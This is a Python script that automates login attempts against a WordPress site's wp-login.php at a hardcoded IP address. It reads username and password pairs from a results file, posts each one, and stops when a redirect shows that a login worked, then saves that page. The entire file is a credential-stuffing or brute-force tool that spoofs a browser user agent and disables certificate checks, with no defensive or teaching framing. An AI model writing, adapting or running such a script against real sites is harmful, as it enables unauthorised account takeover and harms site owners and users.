import requests
import webbrowser

combine_file = open("results.txt", 'r', encoding="utf-8")
l = []
with open("results.txt", mode="r", encoding='utf-8') as file_1:
    for line in file_1:
        log, pwd = line.split(',')
        login_data = dict()
        print(log.encode('utf-8').decode('utf-8'))
        login_data = {
            'log':log,
            'pwd':pwd.strip(),
        }
        l.append(login_data)
    file_1.close()
for login_data in l:
    with requests.Session() as s:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
        headers = {
            'Userr_Agent': user_agent
        }
        # url = "https://3.16.240.57/wp-login.php"
        url="http://3.16.240.57/wp-login.php"
        r = s.post(url, data = login_data, headers=headers, verify=False)
        with(open('f1.html', "wb+")) as f:
            if r.url != url:
                break
            print(r.status_code)
            print("\nNew URL", r.url)
            print("\nRedirection:")
            for i in r.history:
                print(i.status_code, i.url)
                new = 2  # open in a new tab, if possible
            f.write(r.content)